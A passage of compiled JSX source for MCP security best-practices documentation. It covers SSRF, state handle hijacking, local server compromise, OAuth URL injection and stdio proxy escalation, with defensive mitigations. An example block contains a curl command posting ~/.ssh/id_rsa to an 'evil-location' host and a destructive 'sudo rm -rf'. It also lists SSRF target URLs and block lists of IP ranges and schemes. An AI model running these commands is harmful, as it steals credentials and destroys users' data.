`,_jsx(_components.code,{children:`http://192.168.1.1/admin`}),` or\n`,_jsx(_components.code,{children:`http://10.0.0.1/api`}),` target internal network services`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Cloud metadata endpoints`}),`: URLs targeting\n`,_jsx(_components.code,{children:`http://169.254.169.254/`}),` (AWS/GCP/Azure metadata service) can\nexfiltrate cloud credentials and instance information`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Localhost services`}),`: URLs like `,_jsx(_components.code,{children:`http://localhost:6379/`}),` can interact\nwith local services (Redis, databases, admin panels)`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`DNS rebinding`}),`: Domains that change DNS resolution between\nvalidation and use (e.g., `,_jsx(_components.code,{children:`https://attacker.com`}),` resolving to a safe\nIP initially, then to `,_jsx(_components.code,{children:`192.168.1.1`}),`)`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Redirect chains`}),`: Normal-looking URLs that redirect to internal\nresources`]}),`\n`]}),`\n`,_jsx(Mermaid,{}),`\n`,_jsx(Heading,{level:`4`,id:`risks-2`,children:`Risks`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Credential exfiltration`}),`: Cloud metadata endpoints often expose\nIAM credentials, API keys, and other secrets`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Internal network reconnaissance`}),`: Error messages reveal information\nabout internal network topology and services`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Service interaction`}),`: POST requests (e.g., to token endpoints) can\ntrigger mutations on internal services`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Firewall bypass`}),`: The MCP client acts as a proxy, bypassing network\nperimeter controls`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data exfiltration`}),`: Internal service responses may be reflected back\nto attackers through error messages or OAuth flows`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-3`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`MCP clients deployed to a server `,_jsx(_components.strong,{children:`MUST`}),` consider SSRF risks and\nimplement appropriate mitigations when fetching OAuth-related URLs.\nWhich protections are appropriate depend on your network environment.`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Enforce HTTPS`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` require HTTPS for all OAuth-related URLs in\nproduction environments:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Reject `,_jsx(_components.code,{children:`http://`}),` URLs except for loopback addresses (`,_jsx(_components.code,{children:`localhost`}),`,\n`,_jsx(_components.code,{children:`127.0.0.1`}),`, `,_jsx(_components.code,{children:`::1`}),`) during development`]}),`\n`,_jsxs(_components.li,{children:[`This aligns with\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-1.5`,children:`OAuth 2.1 Section 1.5`}),`\nwhich requires HTTPS for all OAuth protocol URLs except loopback\nredirect URIs`]}),`\n`,_jsx(_components.li,{children:`Provide an explicit opt-out mechanism for development/testing\nscenarios`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Block Private IP Ranges`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` block requests to private and reserved IP address\nranges as recommended by\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/rfc9728#section-7.7`,children:`RFC 9728 Section 7.7`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Private IPv4 ranges: `,_jsx(_components.code,{children:`10.0.0.0/8`}),`, `,_jsx(_components.code,{children:`172.16.0.0/12`}),`,\n`,_jsx(_components.code,{children:`192.168.0.0/16`})]}),`\n`,_jsxs(_components.li,{children:[`Loopback: `,_jsx(_components.code,{children:`127.0.0.0/8`}),`, `,_jsx(_components.code,{children:`::1`}),` (except when explicitly allowed for\ndevelopment)`]}),`\n`,_jsxs(_components.li,{children:[`Link-local: `,_jsx(_components.code,{children:`169.254.0.0/16`}),` (including cloud metadata endpoints)`]}),`\n`,_jsxs(_components.li,{children:[`Private IPv6 ranges: `,_jsx(_components.code,{children:`fc00::/7`}),`, `,_jsx(_components.code,{children:`fe80::/10`})]}),`\n`]}),`\n`,_jsx(Note,{children:_jsx(_components.p,{children:`Avoid implementing IP validation manually. Attackers exploit encoding tricks\n(octal, hex, IPv4-mapped IPv6) that custom parsers often miss.`})}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Validate Redirect Targets`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` apply the same URL validation to redirect\ntargets:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Do not blindly follow redirects to internal resources`}),`\n`,_jsx(_components.li,{children:`Apply HTTPS and IP range restrictions to redirect destinations`}),`\n`,_jsx(_components.li,{children:`Consider disabling automatic redirect following and validating each\nhop`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Use Egress Proxies`})}),`\n`,_jsxs(_components.p,{children:[`For server-side MCP client deployments, operators `,_jsx(_components.strong,{children:`SHOULD`}),` consider\nusing an egress proxy that enforces network policies:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Route OAuth discovery requests through a proxy that blocks internal\ndestinations`}),`\n`,_jsxs(_components.li,{children:[`Use tools like\n`,_jsx(_components.a,{href:`https://github.com/stripe/smokescreen`,children:`Smokescreen`}),` or similar\negress proxies that prevent SSRF by design`]}),`\n`,_jsx(_components.li,{children:`Configure network policies to restrict the MCP client’s outbound\naccess`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`DNS Resolution Considerations`})}),`\n`,_jsx(_components.p,{children:`Be aware of Time-of-Check to Time-of-Use (TOCTOU) issues with\nDNS-based validation:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`An attacker’s domain may resolve to a safe IP during validation but\nto an internal IP during the actual request`}),`\n`,_jsx(_components.li,{children:`Consider pinning DNS resolution results between check and use`}),`\n`,_jsx(_components.li,{children:`Defense in depth: combine DNS checks with other mitigations`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`ssrf-against-authorization-servers`,children:`SSRF Against Authorization Servers`}),`\n`,_jsxs(_components.p,{children:[`SSRF risks are not limited to MCP clients. When an authorization\nserver supports\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents`,children:`Client ID Metadata Documents`}),`,\nthe authorization server takes a URL as input from an unknown client\nand fetches that URL. A malicious client could use this to trigger\nthe authorization server to make requests to arbitrary URLs, such as\nrequests to private administration endpoints the authorization server\nhas access to.`]}),`\n`,_jsxs(_components.p,{children:[`The mitigations described above, such as blocking private IP ranges\nand using egress proxies, apply equally to authorization servers\nfetching client metadata documents. See\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-server-side-request-forgery`,children:`Server Side Request Forgery (SSRF) Attacks`}),`\nin the Client ID Metadata Document specification for further\nguidance.`]}),`\n`,_jsx(Heading,{level:`4`,id:`resources-and-tools`,children:`Resources and Tools`}),`\n`,_jsx(_components.p,{children:`The following resources can help developers implement SSRF protections\nin MCP clients.`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Reference Documentation`})}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.a,{href:`https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html`,children:`OWASP SSRF Prevention Cheat Sheet`}),`:\nComprehensive guidance on SSRF prevention techniques, including input\nvalidation, allowlist strategies, and network-level controls`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.a,{href:`https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/`,children:`OWASP Top 10 A10:2021 - SSRF`}),`:\nSSRF in the context of the most critical web application security\nrisks`]}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`state-handle-hijacking`,children:`State Handle Hijacking`}),`\n`,_jsxs(_components.p,{children:[`MCP is `,_jsx(_components.a,{href:`/specification/2026-07-28/basic/index#statelessness`,children:`stateless`}),` and\nhas no protocol-level sessions. Servers that need state spanning\nmultiple requests mint an explicit handle, such as a shopping cart ID\nor a workflow ID, and receive it back as an ordinary tool argument on\neach request. State handle hijacking is an attack vector where an\nunauthorized party obtains or guesses such a handle and uses it to\naccess or modify another user’s state.`]}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-3`,children:`Attack Description`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`The MCP server mints a state handle for an authenticated user and\nreturns it in a tool result.`}),`\n`,_jsx(_components.li,{children:`The attacker obtains or guesses the handle.`}),`\n`,_jsx(_components.li,{children:`The attacker calls the MCP server’s tools with the handle as an\nargument.`}),`\n`,_jsx(_components.li,{children:`The MCP server does not check whether the handle belongs to the\ncaller and operates on the original user’s state, allowing\nunauthorized access or actions.`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-4`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`MCP servers that implement authorization `,_jsx(_components.strong,{children:`MUST`}),` verify all inbound\nrequests. MCP servers `,_jsx(_components.strong,{children:`MUST NOT`}),` treat possession of a state handle\nas authentication.`]}),`\n`,_jsxs(_components.p,{children:[`MCP servers `,_jsx(_components.strong,{children:`SHOULD`}),` use secure, non-deterministic handles generated\nwith secure random number generators. Avoid predictable or sequential\nidentifiers that could be guessed by an attacker. Expiring handles can\nalso reduce the risk.`]}),`\n`,_jsxs(_components.p,{children:[`MCP servers `,_jsx(_components.strong,{children:`SHOULD`}),` bind handles server-side to the authenticated\nuser, for example by keying stored state as `,_jsx(_components.code,{children:`\u003cuser_id\u003e:\u003chandle\u003e`}),` where\nthe user ID is derived from the verified token rather than supplied by\nthe client, and reject a handle presented by any other principal. This\nensures that even if an attacker guesses a handle, they cannot\nimpersonate another user.`]}),`\n`,_jsxs(_components.p,{children:[`For guidance on securing the server-assigned session IDs used by\nprotocol version `,_jsx(_components.code,{children:`2025-11-25`}),` and earlier, see\n`,_jsx(_components.a,{href:`/docs/2025-11-25/tutorials/security/security_best_practices#session-hijacking`,children:`Session Hijacking in the 2025-11-25 version of this page`}),`.`]}),`\n`,_jsx(Heading,{level:`3`,id:`local-mcp-server-compromise`,children:`Local MCP Server Compromise`}),`\n`,_jsx(_components.p,{children:`Local MCP servers are MCP Servers running on a user’s local machine,\neither by the user downloading and executing a server, authoring a\nserver themselves, or installing through a client’s configuration flows.\nThese servers may have direct access to the user’s system and may be\naccessible to other processes running on the user’s machine, making them\nattractive targets for attacks.`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-4`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`Local MCP servers are binaries that are downloaded and executed on the\nsame machine as the MCP client. Without proper sandboxing and consent\nrequirements in place, the following attacks become possible:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`An attacker includes a malicious “startup” command in a client\nconfiguration`}),`\n`,_jsx(_components.li,{children:`An attacker distributes a malicious payload inside the server itself`}),`\n`,_jsx(_components.li,{children:`An attacker accesses an insecure local server that’s left running on\nlocalhost via DNS rebinding`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Example malicious startup commands that could be embedded:`}),`\n`,_jsx(CodeBlock,{filename:``,numberOfLines:`5`,language:`shellscript`,children:_jsx(_components.pre,{className:`shiki shiki-themes github-light-default dark-plus`,style:{backgroundColor:`#ffffff`,\"--shiki-dark-bg\":`#0B0C0E`,color:`#1f2328`,\"--shiki-dark\":`#D4D4D4`},language:`shellscript`,children:_jsxs(_components.code,{language:`shellscript`,numberOfLines:`5`,children:[_jsx(_components.span,{className:`line`,children:_jsx(_components.span,{style:{color:`#6E7781`,\"--shiki-dark\":`#6A9955`},children:`# Data exfiltration`})}),`\n`,_jsxs(_components.span,{className:`line`,children:[_jsx(_components.span,{style:{color:`#953800`,\"--shiki-dark\":`#DCDCAA`},children:`npx`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` malicious-package`}),_jsx(_components.span,{style:{color:`#1F2328`,\"--shiki-dark\":`#D4D4D4`},children:` \u0026\u0026 `}),_jsx(_components.span,{style:{color:`#953800`,\"--shiki-dark\":`#DCDCAA`},children:`curl`}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#569CD6`},children:` -X`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` POST`}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#569CD6`},children:` -d`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` @~/.ssh/id_rsa`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` https://example.com/evil-location`})]}),`\n`,_jsx(_components.span,{className:`line`}),`\n`,_jsx(_components.span,{className:`line`,children:_jsx(_components.span,{style:{color:`#6E7781`,\"--shiki-dark\":`#6A9955`},children:`# Privilege escalation`})}),`\n`,_jsxs(_components.span,{className:`line`,children:[_jsx(_components.span,{style:{color:`#953800`,\"--shiki-dark\":`#DCDCAA`},children:`sudo`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` rm`}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#569CD6`},children:` -rf`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` /important/system/files`}),_jsx(_components.span,{style:{color:`#1F2328`,\"--shiki-dark\":`#D4D4D4`},children:` \u0026\u0026 `}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#DCDCAA`},children:`echo`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` \"MCP server installed!\"`})]}),`\n`]})})}),`\n`,_jsx(Heading,{level:`4`,id:`risks-3`,children:`Risks`}),`\n`,_jsx(_components.p,{children:`Local MCP servers with inadequate restrictions or from untrusted sources\nintroduce several critical security risks:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Arbitrary code execution`}),`. Attackers can execute any command with\nMCP client privileges.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`No visibility`}),`. Users have no insight into what commands are being\nexecuted.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Command obfuscation`}),`. Malicious actors can use complex or\nconvoluted commands to appear legitimate.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data exfiltration`}),`. Attackers can access legitimate local MCP\nservers via compromised JavaScript.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data loss`}),`. Attackers or bugs in legitimate servers could lead to\nirrecoverable data loss on the host machine.`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-5`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`If an MCP client supports one-click local MCP server configuration, it\n`,_jsx(_components.strong,{children:`MUST`}),` implement proper consent mechanisms prior to executing commands.`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Pre-Configuration Consent`})}),`\n`,_jsxs(_components.p,{children:[`Display a clear consent dialog before connecting a new local MCP server\nvia one-click configuration. The MCP client `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Show the exact command that will be executed, without truncation\n(include arguments and parameters)`}),`\n`,_jsx(_components.li,{children:`Clearly identify it as a potentially dangerous operation that executes\ncode on the user’s system`}),`\n`,_jsx(_components.li,{children:`Require explicit user approval before proceeding`}),`\n`,_jsx(_components.li,{children:`Allow users to cancel the configuration`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`The MCP client `,_jsx(_components.strong,{children:`SHOULD`}),` implement additional checks and guardrails to\nmitigate potential code execution attack vectors:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Highlight potentially dangerous command patterns (e.g., commands\ncontaining `,_jsx(_components.code,{children:`sudo`}),`, `,_jsx(_components.code,{children:`rm -rf`}),`, network operations, file system access\noutside expected directories)`]}),`\n`,_jsx(_components.li,{children:`Display warnings for commands that access sensitive locations (home\ndirectory, SSH keys, system directories)`}),`\n`,_jsx(_components.li,{children:`Warn that MCP servers run with the same privileges as the client`}),`\n`,_jsx(_components.li,{children:`Execute MCP server commands in a sandboxed environment with minimal\ndefault privileges`}),`\n`,_jsx(_components.li,{children:`Launch MCP servers with restricted access to the file system, network,\nand other system resources`}),`\n`,_jsx(_components.li,{children:`Provide mechanisms for users to explicitly grant additional privileges\n(e.g., specific directory access, network access) when needed`}),`\n`,_jsx(_components.li,{children:`Use platform-appropriate sandboxing technologies (containers, chroot,\napplication sandboxes, etc.)`}),`\n`,_jsx(_components.li,{children:`Keep sandboxing solutions up-to-date to account for emerging\nvulnerabilities`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`MCP servers intending for their servers to be run locally `,_jsx(_components.strong,{children:`SHOULD`}),`\nimplement measures to prevent unauthorized usage from malicious\nprocesses:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Use the `,_jsx(_components.code,{children:`stdio`}),` transport to limit access to just the MCP client`]}),`\n`,_jsxs(_components.li,{children:[`Restrict access if using an HTTP transport, such as:`,`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Require an authorization token`}),`\n`,_jsx(_components.li,{children:`Use unix domain sockets or other Interprocess Communication (IPC)\nmechanisms with restricted access`}),`\n`]}),`\n`]}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`oauth-authorization-url-validation`,children:`OAuth Authorization URL Validation`}),`\n`,_jsx(_components.p,{children:`OAuth authorization URLs provided by malicious MCP servers can exploit client-side URL handling vulnerabilities, leading to Cross-Site Scripting (XSS) attacks and Remote Code Execution (RCE).`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-5`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`During the OAuth authorization flow, MCP servers provide authorization URLs that clients open in browsers or handle programmatically. Malicious servers can exploit insufficient URL validation in MCP clients through the following attack vectors:`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`JavaScript URL Injection (XSS)`})}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[`A malicious MCP server provides a `,_jsx(_components.code,{children:`javascript:`}),` URL as the authorization endpoint`]}),`\n`,_jsxs(_components.li,{children:[`The MCP client passes this URL directly to `,_jsx(_components.code,{children:`window.open()`}),` or similar browser APIs`]}),`\n`,_jsx(_components.li,{children:`The browser executes the JavaScript code embedded in the URL`}),`\n`,_jsx(_components.li,{children:`The attacker gains JavaScript execution context within the client application, potentially leading to session hijacking, credential theft, or further exploitation`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Command Injection via Shell Execution`})}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`A malicious MCP server provides a URL containing shell command injection payloads`}),`\n`,_jsxs(_components.li,{children:[`The MCP client uses shell commands (e.g., `,_jsx(_components.code,{children:`cmd.exe`}),`, PowerShell, or shell scripts) to open the URL`]}),`\n`,_jsx(_components.li,{children:`The shell interprets parts of the URL as additional commands to execute`}),`\n`,_jsx(_components.li,{children:`The attacker achieves arbitrary code execution on the user’s system`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`stdio Transport Privilege Escalation`})}),`\n`,_jsxs(_components.p,{children:[`When XSS vulnerabilities are combined with `,_jsx(_components.code,{children:`stdio`}),` transport capabilities,\nattackers can escalate web-based attacks to full system compromise. See\n`,_jsx(_components.a,{href:`#stdio-transport-security-in-proxy-scenarios`,children:`stdio Transport Security in Proxy Scenarios`}),`\nfor detailed attack vectors and mitigations.`]}),`\n`,_jsx(Mermaid,{}),`\n`,_jsx(Heading,{level:`4`,id:`risks-4`,children:`Risks`}),`\n`,_jsx(_components.p,{children:`OAuth authorization URL vulnerabilities introduce several critical security risks:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Cross-Site Scripting (XSS)`}),`. Malicious JavaScript execution can lead to session hijacking, credential theft, and unauthorized actions within the client application.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Remote Code Execution (RCE)`}),`. Command injection through shell execution allows attackers to run arbitrary code with user privileges.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Privilege Escalation`}),`. XSS combined with `,_jsx(_components.code,{children:`stdio`}),` transport can escalate web-based attacks to full system compromise.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data Exfiltration`}),`. Attackers can access sensitive data, configuration files, and credentials stored on the user’s system.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Persistence`}),`. Attackers can install malware, create backdoors, or modify system configurations for persistent access.`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-6`,children:`Mitigation`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`URL Scheme Validation`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`MUST`}),` validate authorization URLs and reject dangerous schemes:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`MUST`}),` only allow `,_jsx(_components.code,{children:`http://`}),` and `,_jsx(_components.code,{children:`https://`}),` schemes for authorization URLs.\nThe `,_jsx(_components.code,{children:`http://`}),` scheme is acceptable only for loopback addresses (such as\n`,_jsx(_components.code,{children:`localhost`}),`, `,_jsx(_components.code,{children:`127.0.0.1`}),`, or `,_jsx(_components.code,{children:`::1`}),`) during local development; authorization\nservers in production `,_jsx(_components.strong,{children:`MUST`}),` use `,_jsx(_components.code,{children:`https://`}),`.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`MUST`}),` reject `,_jsx(_components.code,{children:`javascript:`}),`, `,_jsx(_components.code,{children:`data:`}),`, `,_jsx(_components.code,{children:`file:`}),`, `,_jsx(_components.code,{children:`vbscript:`}),`, and other potentially dangerous schemes`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`SHOULD`}),` use allowlist-based validation rather than blocklist-based approaches`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Secure URL Opening`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`MUST`}),` avoid shell execution when opening URLs:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`MUST NOT`}),` use shell commands (e.g., `,_jsx(_components.code,{children:`cmd.exe`}),`, `,_jsx(_components.code,{children:`sh`}),`, PowerShell) to open URLs`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`SHOULD`}),` use platform-specific, non-shell URL opening mechanisms`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Content Security Policy (CSP)`})}),`\n`,_jsxs(_components.p,{children:[`Web-based MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` implement Content Security Policy headers to prevent JavaScript execution:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Set `,_jsx(_components.code,{children:`script-src 'self'`}),` to prevent execution of inline JavaScript`]}),`\n`,_jsxs(_components.li,{children:[`Use `,_jsx(_components.code,{children:`default-src 'self'`}),` to restrict resource loading`]}),`\n`,_jsxs(_components.li,{children:[`Consider `,_jsx(_components.code,{children:`script-src 'nonce-\u003crandom\u003e'`}),` for dynamic content that requires inline scripts`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Input Sanitization`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`MUST`}),` sanitize and validate all URLs received from MCP servers:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Implement strict URL parsing and validation`}),`\n`,_jsx(_components.li,{children:`Reject URLs with special characters that could be interpreted by shells`}),`\n`,_jsx(_components.li,{children:`Consider using dedicated URL sanitization libraries`}),`\n`,_jsx(_components.li,{children:`Log suspicious authorization URLs for security monitoring`}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`stdio-transport-security-in-proxy-scenarios`,children:`stdio Transport Security in Proxy Scenarios`}),`\n`,_jsxs(_components.p,{children:[`The `,_jsx(_components.code,{children:`stdio`}),` transport itself is not inherently vulnerable. However, in proxy architectures where a separate proxy service manages `,_jsx(_components.code,{children:`stdio`}),` connections and can spawn MCP servers as child processes, it can provide a critical escalation path from web-based attacks to full system compromise.`]}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-6`,children:`Attack Description`}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Important`}),`: This attack vector only applies to MCP implementations that use a proxy architecture, not to direct `,_jsx(_components.code,{children:`stdio`}),` transport usage.`]}),`\n`,_jsxs(_components.p,{children:[`In proxy-based MCP implementations, a local proxy service sits between the client and MCP servers, spawning servers as child processes via the `,_jsx(_components.code,{children:`stdio`}),` transport. This architecture creates a privileged escalation path when combined with client-side vulnerabilities:`]}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`Attacker achieves XSS or other client-side code execution (e.g., through OAuth URL vulnerabilities)`}),`\n`,_jsx(_components.li,{children:`Using the attack vector above, the malicious actor accesses the MCP proxy authentication token established between the client and the proxy from the client’s environment`}),`\n`,_jsx(_components.li,{children:`Malicious actor makes authenticated requests to the local MCP proxy service`}),`\n`,_jsxs(_components.li,{children:[`Proxy spawns arbitrary commands via the `,_jsx(_components.code,{children:`stdio`}),` transport (believing they are legitimate MCP server commands)`]}),`\n`,_jsx(_components.li,{children:`Attacker achieves Remote Code Execution with user privileges`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`risks-5`,children:`Risks`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Privilege Escalation`}),`. Web-based vulnerabilities (XSS) can escalate to arbitrary code execution on the host system through proxy command execution`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Authentication Bypass`}),`. Stolen proxy authentication tokens allow unauthorized access to stdio process spawning capabilities`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`System Compromise`}),`. Attackers can execute any command that the MCP proxy process has privileges to run`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-7`,children:`Mitigation`}),`\n`,_jsx(_components.p,{children:`The primary defense is to prevent classes of vulnerabilities that enable this attack vector:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Implement the mitigations described in `,_jsx(_components.a,{href:`#oauth-authorization-url-validation`,children:`OAuth Authorization URL Validation`})]}),`\n`,_jsx(_components.li,{children:`Use Content Security Policy (CSP) to prevent JavaScript execution from untrusted sources`}),`\n`,_jsx(_components.li,{children:`Validate and sanitize all input from MCP servers before processing`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Since XSS fundamentally compromises the client’s security context, focus on limiting the damage:`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`stdio Transport Restrictions`})}),`\n`,_jsxs(_components.p,{children:[`MCP proxy services `,_jsx(_components.strong,{children:`SHOULD`}),` implement additional security controls for `,_jsx(_components.code,{children:`stdio`}),` transport:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Implement sandboxing or containerization for spawned processes`}),`\n`,_jsx(_components.li,{children:`Restrict file system access for spawned MCP servers`}),`\n`,_jsxs(_components.li,{children:[`Log all `,_jsx(_components.code,{children:`stdio`}),` transport usage for security monitoring`]}),`\n`,_jsx(_components.li,{children:`Require additional authorization for potentially dangerous commands`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Client-Side Protections`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` implement defense-in-depth measures:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Isolate proxy communication in a separate security context when possible`}),`\n`,_jsx(_components.li,{children:`Use principle of least privilege for proxy process permissions`}),`\n`,_jsx(_components.li,{children:`Implement process-level sandboxing for the proxy service itself`}),`\n`,_jsx(_components.li,{children:`Consider running the proxy in a container or restricted environment`}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`mix-up-attacks`,children:`Mix-Up Attacks`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-7`,children:`Attack Description`}),`\n`,_jsxs(_components.p,{children:[`An MCP client typically interacts with many authorization servers\nover its lifetime. An attacker that controls one of those\nauthorization servers may attempt to have the client send it an\nauthorization code or token issued by a different, honest\nauthorization server (a mix-up attack, described in\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/rfc9207#section-1`,children:`RFC9207 